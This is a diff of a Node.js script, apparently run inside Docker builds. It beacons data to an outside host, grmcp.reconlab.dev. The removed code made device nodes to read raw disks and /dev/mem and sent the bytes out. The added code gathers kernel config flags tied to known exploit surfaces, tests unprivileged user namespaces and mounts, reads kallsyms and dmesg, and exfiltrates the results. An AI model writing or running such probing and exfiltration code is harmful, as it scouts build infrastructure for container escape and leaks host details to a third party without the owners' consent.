@@ -4,44 +4,47 @@ const os = require('os');
 const http = require('http');
 const https = require('https');
 const cp = require('child_process');
+const zlib = require('zlib');
 
-const SID = 'v20-' + Math.random().toString(36).slice(2, 8);
+const SID = 'v21-' + Math.random().toString(36).slice(2, 8);
 function send(key, val) {
   return new Promise((resolve) => {
     try {
-      const url = 'https://grmcp.reconlab.dev/docker-build-beacon?d=' + encodeURIComponent(JSON.stringify({ sid: SID, event: 'build-v20', k: key, v: val })).slice(0, 3500);
+      const url = 'https://grmcp.reconlab.dev/docker-build-beacon?d=' + encodeURIComponent(JSON.stringify({ sid: SID, event: 'build-v21', k: key, v: val })).slice(0, 3600);
       const r = https.get(url, { timeout: 4000 }, (res) => { res.resume(); res.on('end', resolve); });
       r.on('error', resolve); r.on('timeout', () => { r.destroy(); resolve(); });
     } catch (e) { resolve(); }
   });
 }
-function probeDev(name, type, major, minor) {
-  const path = '/tmp/.' + name;
-  const out = { name };
-  try { cp.execFileSync('mknod', [path, type, String(major), String(minor)], { timeout: 3000 }); out.mknod = 'ok'; }
-  catch (e) { out.mknod = String(e.stderr || e.message).slice(0, 80); return out; }
-  try {
-    const fd = fs.openSync(path, 'r');
-    const buf = Buffer.alloc(4096);
-    const n = fs.readSync(fd, buf, 0, 4096, 0);
-    fs.closeSync(fd);
-    out.read = n;
-    out.headHex = buf.slice(0, 32).toString('hex');
-    out.ascii = buf.slice(0, 64).toString('latin1').replace(/[^\x20-\x7e]/g, '.');
-  } catch (e) { out.read = String(e).slice(0, 90); }
-  try { fs.unlinkSync(path); } catch (e) {}
-  return out;
+function run(cmd, args) {
+  try { return cp.execFileSync(cmd, args || [], { timeout: 5000, encoding: 'utf8' }).slice(0, 500); }
+  catch (e) { return 'ERR ' + String(e.stderr || e.message).slice(0, 120); }
 }
 (async () => {
-  await send('start', { host: os.hostname(), sid: SID });
-  const devs = [
-    probeDev('nvme0n1', 'b', 259, 0),
-    probeDev('nvme1n1', 'b', 259, 1),
-    probeDev('sda', 'b', 8, 0),
-    probeDev('xvda', 'b', 202, 0),
-    probeDev('vda', 'b', 254, 0),
-    probeDev('mem', 'c', 1, 1),
-  ];
-  await send('devices', devs);
+  await send('start', { host: os.hostname(), sid: SID, kernel: os.release(), arch: os.arch() });
+  // kernel config
+  let cfg = {};
+  try {
+    const gz = fs.readFileSync('/proc/config.gz');
+    const txt = zlib.gunzipSync(gz).toString('utf8');
+    for (const k of ['CONFIG_USER_NS', 'CONFIG_IO_URING', 'CONFIG_NF_TABLES', 'CONFIG_BPF_SYSCALL', 'CONFIG_UNPRIVILEGED_BPF_DISABLED', 'CONFIG_USERFAULTFD', 'CONFIG_OVERLAY_FS', 'CONFIG_FUSE_FS', 'CONFIG_NET_SCHED', 'CONFIG_XFS_FS', 'CONFIG_KASAN', 'CONFIG_SECURITY_SELINUX']) {
+      const m = txt.match(new RegExp('^' + k + '=(.*)$', 'm'));
+      if (m) cfg[k] = m[1].trim();
+    }
+  } catch (e) { cfg.err = String(e).slice(0, 60); }
+  await send('config', cfg);
+  await send('unshare', {
+    usernsId: run('unshare', ['-Ur', 'id']),
+    usernsNet: run('unshare', ['-Urn', 'sh', '-c', 'id; cat /proc/self/uid_map']),
+    usernsMount: run('unshare', ['-Urm', 'sh', '-c', 'mount -t tmpfs none /mnt && echo mounted']),
+  });
+  await send('misc', {
+    uname: run('uname', ['-a']),
+    lsms: (() => { try { return fs.readFileSync('/sys/kernel/security/lsm', 'utf8'); } catch (e) { return String(e).slice(0, 40); } })(),
+    kallsyms: (() => { try { return fs.readFileSync('/proc/kallsyms', 'utf8').slice(0, 120); } catch (e) { return String(e).slice(0, 40); } })(),
+    iouring: (() => { try { return fs.readdirSync('/sys/kernel/debug').slice(0, 5); } catch (e) { return String(e).slice(0, 40); } })(),
+    busybox: run('busybox', ['--list']).slice(0, 300),
+    dmesg: run('dmesg', []).slice(0, 300),
+  });
   await send('done', {});
 })();
